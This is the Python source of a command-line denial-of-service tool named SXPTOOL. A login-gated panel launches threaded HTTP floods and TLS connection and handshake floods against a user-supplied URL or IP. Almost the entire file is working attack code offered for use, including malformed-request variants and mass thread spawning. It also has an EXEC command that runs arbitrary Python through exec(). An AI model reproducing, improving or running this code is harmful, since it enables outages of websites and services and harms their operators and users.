from colored import fg,bg,attr
import socket,ssl,threading,random,string,sys,warnings,time,requests
from urllib.parse import urlparse
import platform,os
from colorama import Fore
from other_data import FILES_MAKER,GET_TIME

# ! CLEAR WARN MESSAGE
warnings.filterwarnings('ignore',category=DeprecationWarning)
# ! GET DATA
target_load = ''
port_load = 0
methods_load = ''
stop_command = ''
attack_ist_id = []

# * DEF & CLASS

def login_checker(username,password):
    file_path = os.path.join(os.path.dirname(__file__), 'login.txt')
    try:
        with open(file_path) as f:
            credentials = [x.strip() for x in f.readlines() if x.strip()]
            for x in credentials:
             c_username, c_password = x.split('@')
             if c_username.upper()  == username.upper() and c_password.upper() == password.upper():
               return True
    except FileNotFoundError:
        return 'UNKNOWN ERROR ARE RETURNING BY FILESNOTFOUND'

def clear_console():
    if platform.system().lower() == 'windows':
       os.system('cls')
    else:
       os.system('clear')

def generate_url_path(num):
    data = "".join(random.sample(string.printable, int(num)))
    return data

def generate_url_path_choice(num):
    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
    data = ""
    for _ in range(int(num)):
        data += random.choice(letter)
    return data

def DoS_Attack(ip,host,port,type_attack,booter_sent,data_type_loader_packet,id):
    global stop_command
    url_path = ''
    path_get = ['PY_FLOOD','CHOICES_FLOOD']
    path_get_loader = random.choice((path_get))
    if path_get_loader == "PY_FLOOD":
        url_path = generate_url_path(5)
    else:
        url_path = generate_url_path_choice(5)
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        if data_type_loader_packet == 'PY' or data_type_loader_packet == 'PYF':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n".encode()
        elif data_type_loader_packet == 'OWN1':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\r\r".encode()
        elif data_type_loader_packet == 'OWN2':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\r\r\n\n".encode()
        elif data_type_loader_packet == 'OWN3':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n".encode()
        elif data_type_loader_packet == 'OWN4':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n".encode()
        elif data_type_loader_packet == 'OWN5':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n\r\r\r\r".encode()
        elif data_type_loader_packet == 'OWN6':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n\r\n".encode()
        elif data_type_loader_packet == 'OWN7':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n\r".encode()
        elif data_type_loader_packet == 'OWN8':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\r\n\r".encode()
        elif data_type_loader_packet == 'TEST':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\r\n\r\n\n".encode()
        elif data_type_loader_packet == 'TEST2':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\n\r\r\n\r\n\n\n".encode()
        elif data_type_loader_packet == 'TEST3':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\a\n\r\n\n".encode()
        elif data_type_loader_packet == 'TEST4':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\a\n\a\n\n\r\r".encode()
        elif data_type_loader_packet == 'TEST5':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\t\n\n\r\r".encode()
        s.connect((ip,port))
        for _ in range(booter_sent):
            if stop_command == id:
               break
            s.sendall(packet_data)
            s.send(packet_data)
    except:
        try:
            s.shutdown(socket.SHUT_RDWR)
            s.close()
        except:
            pass

def SSL_PACKET(target,methods,duration_sec_attack_dude,id):
    global stop_command
    for _ in range(int(duration_sec_attack_dude)):
        if stop_command == id:
            break
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((str(target['host']),int(target['port'])))
            s.connect_ex((str(target['host']),int(target['port'])))
            ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1_1,ssl.PROTOCOL_TLSv1_2)
            ssl_context.set_ciphers('AES128-GCM-SHA256:AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-SHA256:DHE-RSA-AES128-SHA256:TLS_ECDHE_PSK_WITH_AES_128_CCM_SHA256:TLS_ECDHE_PSK_WITH_AES_128_CCM_8_SHA256')
            ssl_socket = ssl_context.wrap_socket(s,server_hostname=target['host'])
            url_path = generate_url_path(1)
            url_leak = ''
            if target['uri'] == '/':
               url_leak = target['uri']
            else:
               url_leak = '/'
            byt = f"{methods} {url_leak} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
            byt2 = f"{methods} /{url_path} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
            for _ in range(500):
                if stop_command == id:
                 break
                ssl_socket.write(byt2)
                ssl_socket.sendall(byt2)
                ssl_socket.write(byt)
                ssl_socket.send(byt)
            ssl_socket.close()
        except:
           pass

status_code = False
def runing_attack(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet,id):
    global status_code,stop_command
    if status_code == True:
        while time.time() < time_loader:
            if stop_command == id:
               break
            for _ in range(spam_loader):
                if stop_command == id:
                 break
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet,id))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet,id))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet,id))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet,id))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet,id))
                th.start()
    else:
        threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet,id)).start()

def RUNING_HTTP(create_thread,spam_create_thread,ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet,id):
    global stop_command
    for loader_num in range(create_thread):
        for _ in range(spam_create_thread):
            if stop_command == id:
              break
            threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet,id)).start()

def get_target(url):
    url = url.rstrip()
    target = {}
    parsed_url = urlparse(url)
    target['uri'] = parsed_url.path or '/'
    target['host'] = parsed_url.netloc
    target['scheme'] = parsed_url.scheme
    target['port'] = parsed_url.port or ("443" if target['scheme'] == "https" else "80")
    return target

def RECREATE_HTTPS(target,booter,METHODS,id):
    global stop_command
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((str(target['host']), int(target['port'])))
        context = ssl.create_default_context()
        ssl_sock = context.wrap_socket(sock, server_hostname=target['host'])
        ssl_sock.do_handshake()
        url_path = generate_url_path(1)
        url_leak = ''
        if target['uri'] == '/':
            url_leak = target['uri']
        else:
            url_leak = '/'
        byt = f"{METHODS} {url_leak} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
        byt2 = f"{METHODS} /{url_path} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
        for _ in range(booter):

            if stop_command == id:
              break

            ssl_sock.sendall(byt2)
            ssl_sock.send(byt)

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((str(target['host']), int(target['port'])))
            context = ssl.create_default_context()
            ssl_sock = context.wrap_socket(sock, server_hostname=target['host'])
            ssl_sock.do_handshake()
    except:
        pass

def tls_test(target, run_time,methods,id):
    global stop_command
    for _ in range(int(run_time)):
        if stop_command == id:
            break
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((str(target['host']), int(target['port'])))
            sock.connect_ex((str(target['host']), int(target['port'])))
            context_list = [
                ssl.SSLContext(ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER),
                ssl.SSLContext(ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER),
                ssl.SSLContext(ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER),
                ssl.SSLContext(ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS),
                ssl.SSLContext(ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLS),
                ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER),
                ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER),
                ssl.SSLContext(),
                ssl.create_default_context(),
                ssl._create_unverified_context(),
                ssl._create_default_https_context()
            ]
            context = random.choice(context_list)
            ssl_sock = context.wrap_socket(sock, server_hostname=target['host'])
            url_path = generate_url_path(1)
            url_leak = ''
            if target['uri'] == '/':
               url_leak = target['uri']
            else:
               url_leak = '/'
            byt = f"{methods} {url_leak} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
            byt2 = f"{methods} /{url_path} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
            for _ in range(500):
                if stop_command == id:
                    break
                ssl_sock.sendall(byt2)
                ssl_sock.send(byt)
            ssl_sock.close()
        except:
            pass

def RUNNING_HTTPS_ALL(methods_leak,thread_made,target,time_booter,METHODS,id):
   global stop_command
   for _ in range(int(thread_made)):
        if stop_command == id:
            break
        if methods_leak == 'RECREATE_HTTPS':
           threading.Thread(target=RECREATE_HTTPS, args=(target, time_booter,METHODS,id)).start()
        elif methods_leak == 'SSL_PACKET':
           threading.Thread(target=SSL_PACKET,args=(target,METHODS,time_booter,id)).start()
        elif methods_leak == 'TLS_TEST':
           threading.Thread(target=tls_test, args=(target, time_booter,METHODS,id)).start()
        else:
           threading.Thread(target=RECREATE_HTTPS, args=(target, time_booter,METHODS,id)).start()
           threading.Thread(target=SSL_PACKET,args=(target,METHODS,time_booter,id)).start()
           threading.Thread(target=tls_test, args=(target, time_booter,METHODS,id)).start()

def CLI_COLOR(mode):
    global target_load,port_load,methods_load
    try:
       mode = mode.lower()
    except:
       pass
    # GUI you can replace its
    if mode == 'banner':
     print(f"""{fg(40)}        ╔═╗{fg(41)}═╗ ╦{fg(42)}╔═╗{fg(43)}┌┬┐{fg(44)}┌─┐{fg(45)}┌─┐{fg(80)}┬  \n{fg(40)}        ╚═╗{fg(41)}╔╩╦╝{fg(42)}╠═╝{fg(43)} │ {fg(44)}│ │{fg(45)}│ │{fg(80)}│  \n{fg(40)}        ╚═╝{fg(41)}╩ ╚═{fg(42)}╩ {fg(7)}o{fg(43)} ┴ {fg(44)}└─┘{fg(45)}└─┘{fg(80)}┴─┘{attr(0)}""")
    elif mode == 'main_banner':
     print(f"""{fg(40)}        ╔═╗{fg(41)}═╗ ╦{fg(42)}╔═╗{fg(43)}┌┬┐{fg(44)}┌─┐{fg(45)}┌─┐{fg(80)}┬  \n{fg(40)}        ╚═╗{fg(41)}╔╩╦╝{fg(42)}╠═╝{fg(43)} │ {fg(44)}│ │{fg(45)}│ │{fg(80)}│  \n{fg(40)}        ╚═╝{fg(41)}╩ ╚═{fg(42)}╩ {fg(7)}o{fg(43)} ┴ {fg(44)}└─┘{fg(45)}└─┘{fg(80)}┴─┘\n{fg(41)}╔══════{fg(43)}═════════════{fg(45)}═══════════════{fg(75)}═════╗╗\n{fg(41)}║    {fg(40)}  WELCOME{fg(41)} GUY {fg(42)}TO {fg(43)}PANEL {fg(44)}SXPTOOL{fg(75)}     ║║\n{fg(41)}╚═╦════{fg(43)}═════════════{fg(45)}═══════════════{fg(75)}═════╩╬╗\n{fg(41)}  ╚══╦═{fg(43)}═════════════{fg(45)}═══════════════{fg(75)}══════╩╩══╗╗\n{fg(41)}     ║   {fg(40)}Type {fg(41)}<{fg(42)}help{fg(41)}> {fg(43)}for show {fg(44)}some command  {fg(75)} ║║\n{fg(41)}  ╔══╩═{fg(43)}═════════════{fg(45)}═══════════════{fg(75)}═╦╦═══════╝╝\n{fg(41)}╔═╩════{fg(43)}═════════════{fg(45)}═══════════════{fg(75)}═╩╩══╗╗\n{fg(41)}║ {fg(214)}━ {fg(184)}━ {fg(40)}https://{fg(41)}discord.gg{fg(42)}/RVe3WjjyYw {fg(184)}━{fg(214)} ━{fg(75)} ║║\n{fg(41)}╚══════{fg(43)}═════════════{fg(45)}═══════════════{fg(75)}═════╝╝\n{fg(196)}Copyright © {fg(166)}2023 Hex1629. {fg(136)}GUI Rights Reserved. {attr(0)}\n""")
    elif mode == 'methods' or mode == 'method':
       print(f'''    {fg(40)}        ╔═╗{fg(41)}═╗ ╦{fg(42)}╔═╗{fg(43)}┌┬┐{fg(44)}┌─┐{fg(45)}┌─┐{fg(80)}┬\n    {fg(40)}        ╚═╗{fg(41)}╔╩╦╝{fg(42)}╠═╝{fg(43)} │ {fg(44)}│ │{fg(45)}│ │{fg(80)}│\n    {fg(40)}        ╚═╝{fg(41)}╩ ╚═{fg(42)}╩ {fg(7)}o{fg(43)} ┴ {fg(44)}└─┘{fg(45)}└─┘{fg(80)}┴─┘\n{fg(4)}          ╔════════════╦═{fg(33)}╗╗ ╔═╗\n{fg(4)}          ╠═══════════{fg(33)}═╩═╣║ ╚═╝\n{fg(4)}     ╔════╣{fg(40)}     HTTP    {fg(33)} ║║\n{fg(4)}     ╠════╣ {fg(41)}XXXXXXXXXXXX{fg(33)} ║╠══════════{fg(45)}══════╦═╗╗\n{fg(4)}     ║    ╚═══════════╦╦═{fg(33)}╝╬══════════════{fg(45)}══╩═╣║\n{fg(4)}     ╚════╦════════{fg(33)}═══╩╩╦═╣╗  {fg(42)}   REG-1m{fg(45)}      ║║\n{fg(4)}          ╠══════════{fg(33)}═══╩═╣║  {fg(43)}REG-NETDATA   {fg(45)} ║║\n{fg(4)}    ╔══╗  ║ {fg(44)}HTTPS_TLS.MIX {fg(33)}║║═══════{fg(45)}══════════╝╝\n{fg(4)}    ╚══╝  ║ {fg(45)}HTPSRE        {fg(33)}║║  ╔══╗\n{fg(4)}    ╚══╝  ║ {fg(46)}HTPC          {fg(33)}║║  ╚══╝\n{fg(4)}    ╚══╝  ║ {fg(47)}HTTPS_ALL     {fg(33)}║║   \n{fg(4)}          ╚═════════{fg(33)}══════╝╝{attr(0)}''')
    elif mode == 'help':
      print(f"""{fg(202)}╔═══{fg(208)}══════{fg(209)}══════════════{fg(210)}════════════╦═══{fg(211)}╗╗\n{fg(202)}║   {fg(112)}MENU {fg(113)}- {fg(114)}LIST {fg(115)}OF {fg(116)}COMMAND {fg(117)}- {fg(87)}MENU  {fg(210)} ║ {fg(1)}X{fg(211)} ║║\n{fg(202)}╠══{fg(208)}═════{fg(209)}══════════════════════{fg(210)}══════╩═══{fg(211)}╣║\n{fg(202)}║ {fg(1)}━ {fg(9)}REQUIRES PARAMETER   {fg(3)}- {fg(11)}NOT REQUIRES{fg(211)} ║║\n{fg(202)}╠════════{fg(208)}═══════════{fg(209)}════════{fg(210)}════════════{fg(211)}╣║\n{fg(202)}║    {fg(112)}HELP {fg(3)}- {fg(117)}For show some command.   {fg(211)}   ║║\n{fg(202)}║    {fg(113)}MENU {fg(3)}- {fg(116)}Return to main panel.    {fg(211)}   ║║\n{fg(202)}║    {fg(114)}PING {fg(3)}- {fg(115)}For check target.       {fg(211)}    ║║\n{fg(202)}║ {fg(115)}METHODS {fg(1)}- {fg(114)}Show methods.            {fg(211)}   ║║\n{fg(202)}║ {fg(116)}   STOP {fg(1)}- {fg(113)}For stop attack            {fg(211)} ║║\n{fg(202)}║ {fg(117)}   EXEC {fg(1)}- {fg(112)}For execute command.       {fg(211)} ║║\n{fg(202)}║     {fg(118)}CLS {fg(3)}- {fg(111)}Clear console.            {fg(211)}  ║║\n{fg(202)}║    {fg(119)}EXIT {fg(1)}- {fg(110)}For exit this panel. {fg(211)}       ║║\n{fg(202)}╚════{fg(208)}════════{fg(209)}═════════════{fg(210)}══════════{fg(211)}════╝╝{attr(0)}\n""")
    elif mode == 'atk':
      print(f"""{fg(41)}SEND {fg(42)}DOS {fg(43)}TO {fg(44)}TARGET {fg(45)}[{fg(196)}METHODS {fg(45)}- {fg(136)}{methods_load}{fg(45)}] {fg(80)}----> {fg(45)}({fg(214)}{target_load}{fg(80)}:{fg(184)}{port_load}{fg(45)}){attr(0)}""")

num_panel = False
def PANEL_USE():
    global num_panel,target_load,port_load,methods_load,status_code,attack_ist_id,stop_command
    if num_panel == False:
      CLI_COLOR('main_banner')
      num_panel = True
    console_prompt = input(f"{fg(115)}ROOT{fg(114)}@{fg(113)}ROOT {fg(112)}$ {attr(0)}").upper()
    arg_load = console_prompt.split(" ")
    if arg_load[0] == 'HELP':
      CLI_COLOR('help')
    elif arg_load[0] == 'BANNER':
       CLI_COLOR('banner')
    elif arg_load[0] == 'CLS' or arg_load[0] == 'CLEAR':
       clear_console()
    elif arg_load[0] == 'MENU':
       clear_console()
       CLI_COLOR('main_banner')
    elif arg_load[0] == 'METHODS':
       CLI_COLOR('methods')
    elif arg_load[0] == 'EXIT':
       print(f"{fg(41)}EXITING {fg(42)}. . . .{attr(0)}")
       try:
          exit()
       except:
          sys.exit()
    elif arg_load[0] == 'HTTP':
        if len(arg_load) == 10:
            data_type_loader_packet = arg_load[1].upper()
            target_loader = str(arg_load[2]).lower()
            port_loader = int(arg_load[3])
            time_loader = time.time() + int(arg_load[4])
            spam_loader = int(arg_load[5])
            create_thread = int(arg_load[6])
            booter_sent = int(arg_load[7])
            methods_loader = arg_load[8]
            spam_create_thread = int(arg_load[9])
            code_leak = True
            host = ''
            ip = ''
            try:
                host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
                if '.gov' in host or '.mil' in host or '.edu' in host or '.ac' in host:
                    code_leak = False
                    print(f"{Fore.GREEN}Uhh You Can't Attack This Website {Fore.WHITE}[ {Fore.YELLOW}.gov .mil .edu .ac {Fore.WHITE}] . . .{Fore.RESET}")
                else:
                    ip = socket.gethostbyname(host)
                    code_leak = True
            except socket.gaierror:
                code_leak = False
                print(f"{Fore.YELLOW}FAILED TO GET URL . . .{Fore.RESET}")
            if code_leak == True:
             id = (f'{arg_load[0]}_{len(arg_load)}_{GET_TIME()}')
             attack_ist_id.append(id)
             threading.Thread(target=RUNING_HTTP,args=(create_thread,spam_create_thread,ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet,id)).start()
            status_code = True
            target_load = ip
            port_load = port_loader
            methods_load = 'HTTP'
            CLI_COLOR('atk')
        else:
             print(f"{fg(136)}! REQUIRE PARAMETER !{attr(0)}")
             print(f"{Fore.RED}HTTP <TYPE_PACKET> <TARGET> <PORT> <TIME> {Fore.LIGHTRED_EX}<SPAM_THREAD> <CREATE_THREAD> <BOOTER_SENT> {Fore.WHITE}<HTTP_METHODS> <SPAM_CREATE>{Fore.RESET}")
             print(f"{fg(154)}EXAMPLE USE --> HTTP {random.choice(('OWN1','TEST','OWN7','PYF'))} {fg(155)}http://{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)} {fg(156)}{random.randint(0,65535)} {fg(157)}{random.randint(1,9999999)} {fg(158)}{random.randint(1,9999999)} {fg(223)}{random.randint(1,9999999)} {fg(222)}{random.randint(1,9999999)} {fg(221)}{random.choice(('GATEWAY','OPTIONS','HEAD','POST','GET'))} {fg(220)}{random.randint(1,9999999)} {attr(0)}")
             print(f"{Fore.CYAN}TYPE_PACKET --> {Fore.WHITE}[ {Fore.LIGHTBLUE_EX}PYF {Fore.WHITE}| TEST TEST2 TEST3 TEST4 TEST5 {Fore.WHITE}| {Fore.BLUE}OWN1 OWN2 OWN3 OWN4 OWN5 OWN6 OWN7 {Fore.WHITE}]\n {Fore.WHITE}[+] {Fore.LIGHTCYAN_EX}TIME (EXAMPLE=250)\n {Fore.WHITE}[+] {Fore.GREEN}SPAM_THREAD (EXAMPLE=299)\n {Fore.WHITE}[+] {Fore.LIGHTGREEN_EX}CREATE_THREAD (EXAMPLE=5)\n {Fore.WHITE}[+] {Fore.LIGHTYELLOW_EX}HTTP_METHODS (EXAMPLE=GATEWAY)\n {Fore.WHITE}[+] {Fore.YELLOW}SPAM_CREATE (EXAMPLE=15){Fore.RESET}")
    elif arg_load[0] == 'HTTPS_TLS.MIX' or arg_load[0] == 'HTPMIX' or arg_load[0] == 'HTMIX':
       if len(arg_load) == 5:
          url = str(arg_load[1]).lower()
          thread_loader = int(arg_load[2])
          time_booter = int(arg_load[3])
          mode_tls = str(arg_load[4])
          target = get_target(url)
          id = (f'{arg_load[0]}_{len(arg_load)}_{GET_TIME()}')
          attack_ist_id.append(id)
          threading.Thread(target=RUNNING_HTTPS_ALL,args=('TLS_TEST',thread_loader,target,time_booter,mode_tls,id)).start()
          target_load = target['host']
          port_load = target['port']
          methods_load = 'HTTPS_TLS.MIX'
          CLI_COLOR('atk')
       else:
          print(f"{fg(136)}! REQUIRE PARAMETER ! {fg(196)}I need like this --> {fg(197)}TARGET {fg(198)}THREAD {fg(199)}TIME {fg(210)}HTTP_METHODS {attr(0)}")
          print(f"{fg(154)}EXAMPLE USE {random.choice(('HTPMIX','HTTPS_TLS.MIX','HTMIX'))} {fg(155)}https://{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)} {fg(156)}{random.randint(1,9999999)} {fg(157)}{random.randint(1,9999999)} {fg(158)}{random.choice(('GATEWAY','OPTIONS','HEAD','POST','GET'))} {attr(0)}")
    elif arg_load[0] == 'HTTPS_ALL' or arg_load[0] == 'HTPALL' or arg_load[0] == 'HTALL':
       if len(arg_load) == 5:
          url = str(arg_load[1]).lower()
          thread_loader = int(arg_load[2])
          time_booter = int(arg_load[3])
          mode_tls = str(arg_load[4])
          target = get_target(url)
          id = (f'{arg_load[0]}_{len(arg_load)}_{GET_TIME()}')
          attack_ist_id.append(id)
          threading.Thread(target=RUNNING_HTTPS_ALL,args=('HTTP_ALL',thread_loader,target,time_booter,mode_tls,id)).start()
          target_load = target['host']
          port_load = target['port']
          methods_load = 'HTTPS_ALL'
          CLI_COLOR('atk')
       else:
          print(f"{fg(136)}! REQUIRE PARAMETER ! {fg(196)}I need like this --> {fg(197)}TARGET {fg(198)}THREAD {fg(199)}TIME {fg(210)}HTTP_METHODS {attr(0)}")
          print(f"{fg(154)}EXAMPLE USE {random.choice(('HTPALL','HTTPS_ALL','HTALL'))} {fg(155)}https://{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)} {fg(156)}{random.randint(1,9999999)} {fg(157)}{random.randint(1,9999999)} {fg(158)}{random.choice(('GATEWAY','OPTIONS','HEAD','POST','GET'))} {attr(0)}")
    elif arg_load[0] == 'HTPTC' or arg_load[0] == 'HTPC' or arg_load[0] == 'HTTPS_TLS.CIPHER':
       if len(arg_load) == 5:
          url = str(arg_load[1]).lower()
          thread_loader = int(arg_load[2])
          time_booter = int(arg_load[3])
          mode_tls = str(arg_load[4])
          target = get_target(url)
          id = (f'{arg_load[0]}_{len(arg_load)}_{GET_TIME()}')
          attack_ist_id.append(id)
          threading.Thread(target=RUNNING_HTTPS_ALL,args=('SSL_LOAD',thread_loader,target,time_booter,mode_tls,id)).start()
          target_load = target['host']
          port_load = target['port']
          methods_load = 'HTTPS_TLS.CIPHER'
          CLI_COLOR('atk')
       else:
          print(f"{fg(136)}! REQUIRE PARAMETER ! {fg(196)}I need like this --> {fg(197)}TARGET {fg(198)}THREAD {fg(199)}TIME {fg(210)}HTTP_METHODS {attr(0)}")
          print(f"{fg(154)}EXAMPLE USE {random.choice(('HTPC','HTTPS_TLS.CIPHER','HTPTC'))} {fg(155)}https://{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)} {fg(156)}{random.randint(1,9999999)} {fg(157)}{random.randint(1,9999999)} {fg(158)}{random.choice(('GATEWAY','OPTIONS','HEAD','POST','GET'))} {attr(0)}")
    elif arg_load[0] == 'HTPSRE' or arg_load[0] == 'HTTPS_RECREATE':
        if len(arg_load) == 5:
            url = str(arg_load[1]).lower()
            thread_loader = int(arg_load[2])
            time_booter = int(arg_load[3])
            mode_tls = str(arg_load[4])
            target = get_target(url)
            id = (f'{arg_load[0]}_{len(arg_load)}_{GET_TIME()}')
            attack_ist_id.append(id)
            threading.Thread(target=RUNNING_HTTPS_ALL,args=('RECREATE_HTTPS',thread_loader,target,time_booter,mode_tls,id)).start()
            target_load = target['host']
            port_load = target['port']
            methods_load = 'HTTPS_RECREATE'
            CLI_COLOR('atk')
        else:
            print(f"{fg(136)}! REQUIRE PARAMETER ! {fg(196)}I need like this --> {fg(197)}TARGET {fg(198)}THREAD {fg(199)}TIME {fg(210)}HTTP_METHODS {attr(0)}")
            print(f"{fg(154)}EXAMPLE USE {random.choice(('HTTPS_RECREATE','HTPSRE'))} {fg(155)}https://{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)} {fg(156)}{random.randint(1,9999999)} {fg(157)}{random.randint(1,9999999)} {fg(158)}{random.choice(('GATEWAY','OPTIONS','HEAD','POST','GET'))} {attr(0)}")
    elif arg_load[0] == 'EXEC':
       mode_attack = input("LOAD SCRIPT (FILES or INPUT) $").upper()
       if mode_attack == 'INPUT':
        num_line = 0
        print(f"WELCOME TO EXECUTE_COMMAND.MOD ( Type ^ for exit )")
        print("you can't use exit() for exit")
        while True:
         try:
           SCRIPT_PY = input(f"[{num_line}] ")
           if SCRIPT_PY == '^':
            print(f"[{num_line}] EXITING From EXEC_COMMAND.MOD !")
            break
           else:
            num_line += 1
            exec(SCRIPT_PY)
         except Exception as e:
           print(F"[ERROR] {e}")
         except BaseException as e:
           print(F"[BASE - ERROR] {e}")
       else:
          try:
             print("EXAMPLE C:\\Users\\ROOT\\Desktop\\script.py")
             files_get = input("PATH FILES ?")
             mode_files_open = input("YOU SCRIPT USE (READ or READBYTES) $")
             if mode_files_open == 'READ' or mode_files_open == 'R':
                SCRIPT_PY = FILES_MAKER(files_get,'R',0)
             else:
                SCRIPT_PY = FILES_MAKER(files_get,'RB',0)
             exec(SCRIPT_PY)
          except Exception as e:
           print(F"[ERROR] {e}")
          except BaseException as e:
           print(F"[BASE - ERROR] {e}")
    elif arg_load[0] == 'STOP':
       if len(attack_ist_id) == 0:
          for data_id in attack_ist_id:
             print(data_id)
          print("TYPE YOU ID NEED KILL")
          id_killer = input("ID $")
          stop_command = id_killer
          for _ in attack_ist_id:
             attack_ist_id.remove(id_killer)
    elif arg_load[0] == 'PING':
       methods_type = input(f"{Fore.GREEN}MODE_PING {Fore.WHITE}({Fore.YELLOW}l4{Fore.WHITE},{Fore.LIGHTYELLOW_EX}l7{Fore.WHITE}) ${Fore.RESET}")
       if methods_type.upper() == 'L7' or methods_type.upper() == 'LAYER7' or methods_type.upper() == '7':
           tar = str(input(f"{Fore.CYAN}URL {Fore.WHITE}${Fore.RESET}"))
           try:
               r = requests.get(url=tar)
               print(f"{fg(34)}CONNECTION {fg(35)}STATUS_CODE={r.status_code} {fg(36)}REASON={r.reason}{attr(0)}")
           except:
               print(f"{fg(196)}CONNECTION {fg(197)}STATUS_CODE=NULL {fg(198)}REASON=NULL{attr(0)}")
               pass
       else:
           status_code_tcp = False
           IP = str(f'{Fore.LIGHTBLUE_EX}IP ${Fore.RESET}')
           PORT = int(f'{Fore.BLUE}PORT ${Fore.RESET}')
           try:
               s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
               s.connect((IP,PORT))
               s.send('HI?')
               d = s.recv(9999999)
               status_code_tcp = True
           except:
               status_code_tcp = False
           if status_code_tcp == True:
               print(f"{Fore.GREEN}CONNECTION=OK {Fore.LIGHTGREEN_EX}DATA_RECV={d.decode()}{Fore.RESET}")
           else:
               print(f"{Fore.RED}CONNECTION=NO {Fore.LIGHTRED_EX}DATA_RECV=NULL{Fore.RESET}")
    else:
       print(f"{fg(196)}{console_prompt} NOT FOUND COMMAND ! {attr(0)}")
    PANEL_USE()
def checker_login():
    global username,password
    clear_console()
    print(f"{Fore.YELLOW}USER - ROOT {Fore.LIGHTYELLOW_EX}PASSWORD - ROOT{Fore.RESET}")
    time.sleep(0.5)
    username = input(f"{Fore.CYAN}USERNAME {Fore.WHITE}${Fore.RESET}")
    time.sleep(0.5)
    password = input(f"{Fore.BLUE}PASSWORD {Fore.WHITE}${Fore.RESET}")
    time.sleep(0.5)
